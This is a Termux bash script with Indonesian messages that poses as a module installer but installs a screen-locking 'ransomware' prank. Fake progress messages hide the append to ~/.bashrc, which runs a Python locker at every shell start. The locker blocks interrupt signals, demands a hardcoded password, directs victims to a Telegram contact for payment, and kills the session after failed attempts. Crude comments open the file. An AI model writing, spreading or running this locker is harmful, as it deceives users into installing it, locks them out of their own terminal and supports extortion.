#wkwk mau recode ya dek? jangan ya dek ya😹
#yg recode kontol nya berkurang 5 cm
#apa liat-liat, pake tinggal pake aj lah


#!/data/data/com.termux/files/usr/bin/bash
clear


echo -e "\033[1;32m[+] Module Belum Terinstall, Tunggu Bre... \033[0m"
sleep 5
clear
echo -e "\033[1;32m[+] Lagi Install Bre Tunggu...\033[0m"
sleep 10
clear
echo -e "\033[1;32m[+] Loading... \033[0m"
sleep 10
clear
echo -e "\033[1;32m[+] Proses Pemasangan...\033[0m"
sleep 15

echo 'python $HOME/.termux_lock.py' >> $HOME/.bashrc


cat > $HOME/.termux_lock.py << 'EOF'
import os
import sys
import time
import signal


PASSWORD = "hanloveshiroko"  
LOCK_FILE = os.path.abspath(__file__) 
ZSHRC_FILE = os.path.expanduser("~/.bashrc")  


def block_exit(signum, frame):
    print("\n\033[1;31m—Tidak bisa keluar! Termux dikunci.\033[0m")

signal.signal(signal.SIGINT, block_exit)   
signal.signal(signal.SIGTSTP, block_exit)  

def remove_lock():
    """Menghapus script dan menghapus baris dari .zshrc"""
    try:
        
        with open(ZSHRC_FILE, "r") as file:
            lines = file.readlines()
        with open(ZSHRC_FILE, "w") as file:
            for line in lines:
                if "python $HOME/.termux_lock.py" not in line:
                    file.write(line)
        
        os.remove(LOCK_FILE)
        print("\033[1;32mTermux Berhasil Di Buka...\033[0m")
        time.sleep(3)
        print("\033[1;32m© Powered By HanX \033[0m")
        time.sleep(3)

        os.system("pkill -9 -f 'com.termux'")

    except Exception as e:
        print(f"\033[1;31mGagal menghapus kunci: {e}\033[0m")

def animate_boot_screen():
    os.system("clear")
    boot_text = [
"SYSTEM TERKENA RANSOMWARE!"
]
    
    for line in boot_text:
        print("\033[1;31m" + line + "\033[0m")
        time.sleep(0.01)  

def lock_termux():
    animate_boot_screen()
    
    for i in range(3, 0, -1):  
        password = input("\nMasukkan Password: ")

        if password == PASSWORD:
            print("\033[1;32m\nPassword Benar! Membuka System...\033[0m\n")
            time.sleep(2)
            os.system("clear")
            remove_lock() 
            return  
        
        print(f"\033[1;31m—Password Salah!\n—Tebus Ke Tele = https://t..me/hanxshiroko\033[0m")

    print("\n\033[1;31m—Aksess Di Tolak! Mematikan Termux...\033[0m")
    time.sleep(1)
    
    os.kill(os.getppid(), signal.SIGKILL)
    sys.exit()

lock_termux()
EOF

chmod +x $HOME/.termux_lock.py

echo -e "\033[1;32m[+] Berhasil Terinstall! \033[0m"
sleep 6
echo -e "\033[1;31m[!] Termux otomatis akan keluar setelah penginstallan selesai... \033[0m"
sleep 6
echo -e "\033[1;31m[!] Tekan Enter \033[0m"
sleep 1

pkill -9 -f "com.termux"
